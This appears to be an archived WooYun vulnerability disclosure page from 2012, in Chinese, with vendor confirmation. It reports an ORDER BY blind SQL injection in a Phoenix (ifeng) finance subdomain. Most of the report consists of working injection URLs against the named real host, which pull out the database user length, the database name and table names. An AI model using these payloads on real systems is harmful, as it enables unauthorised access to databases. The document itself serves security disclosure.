@@ -1,0 +1,190 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		凤凰网某分站注入  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		凤凰网某分站注入  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/HRay">HRay</a> 
+</li><li>提交时间：		2012-07-01 16:37</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-07-01：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-07-01：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-07-11：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-07-21：	细节向普通白帽子公开<br/>
+									2012-07-31：	细节向实习白帽子公开<br/>
+									2012-08-15：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">凤凰网某分站注入，可获取数据库内容</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">前几天在乌云看到一个orderby的盲注 <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-07406">WooYun: 中关村在线order by语句的盲注思路的分享</a> <br />
+<br />
+于是自己也想学习一下，找到一个凤凰网分站的orderby注入点<br />
+<br />
+首先</p><pre><code>http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&amp;fund_type=gp&amp;orderby=abs(jjdm-(length(user())&gt;22)*8000)&amp;ordertype=asc</code></pre><p class='detail'>返回页面<br />
+<br />
+</p><p class="detail"><a href="../images/011254086246ccc21703f184614a894518e0ee95.jpg" target="_blank"><img src="../images/011254086246ccc21703f184614a894518e0ee95.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+而后尝试几个值，到</p><pre><code>http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&amp;fund_type=gp&amp;orderby=abs(jjdm-(length(user())=22)*8000)&amp;ordertype=asc</code></pre><p class='detail'>返回页面<br />
+<br />
+</p><p class="detail"><a href="../images/01125611ea6dec9082edf71931cf9f8e52fd31eb.jpg" target="_blank"><img src="../images/01125611ea6dec9082edf71931cf9f8e52fd31eb.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+判定user()长度为22个字符，这里已经可以判断出这是一个注入点，为了让管理认识到危害，我们接着往下暴数据<br />
+<br />
+</p><pre><code>http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&amp;fund_type=gp&amp;orderby=abs(jjdm-(ascii(substring((database()),1,1))=102)*8000)&amp;ordertype=asc</code></pre><p class='detail'>依次往下，获取库名为finance<br />
+<br />
+</p><pre><code>http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&amp;fund_type=gp&amp;orderby=abs(jjdm-((select count(*) from information_schema.tables where table_schema=0x66696E616E6365)=136)*8000)&amp;ordertype=asc</code></pre><p class='detail'>看来有136个表，这里我们只跑出一个表就可以了，毕竟只是提醒厂商修复漏洞，而不是做渗透测试<br />
+<br />
+</p><pre><code>http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&amp;fund_type=gp&amp;orderby=abs%28jjdm-%28length%28%28select%20distinct%20table_name%20from%20information_schema.tables%20where%20table_schema=0x66696E616E6365%20limit%201,1%29%29=6%29*8000%29&amp;ordertype=asc</code></pre><p class='detail'>这里我挑一个短的，第二个表长度为6，并且遇到了一个问题，有时不管表达式是真或假，都会返回这样一个页面<br />
+<br />
+</p><p class="detail"><a href="../images/011306088193da70481e7263135353d6fa202fd2.jpg" target="_blank"><img src="../images/011306088193da70481e7263135353d6fa202fd2.jpg" alt="" width="600"/></a></p><p class="detail">没有返回有股票信息的页面，让我无法判断，后来发现有些出现这种错误的页面在表达式后面加上注释符可以解决，不过并不完美，还是有一些时候会出现这种错误，希望各位大牛指点一下，不只是这种，sleep也是，某些页面不管用&gt;100 =100或者&lt;100都不会延迟<br />
+<br />
+最后</p><pre><code>http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&amp;fund_type=gp&amp;orderby=abs(jjdm-(ascii(substring((select distinct table_name from information_schema.tables where table_schema=0x66696E616E6365 limit 1,1),1,1))=97)*8000)#&amp;ordertype=asc</code></pre><p class='detail'>这种形式爆出该表名称为all_hq<br />
+<br />
+至此检测结束，希望厂家尽快修复 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&amp;fund_type=gp&amp;orderby=abs(jjdm-(length(user())=22)*8000)&amp;ordertype=asc</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>http://app.finance.ifeng.com/finance/fundhtml/indexpj.php?pj_type=CHENXING&amp;fund_type=gp&amp;orderby=abs(jjdm-(ascii(substring((database()),7,1))=101)*8000)&amp;ordertype=asc</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">严格过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/HRay" title="HRay">HRay</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-09095" title="凤凰网某分站注入">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2012-07-01 20:07</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您对凤凰网信息安全的关注。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="9095";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
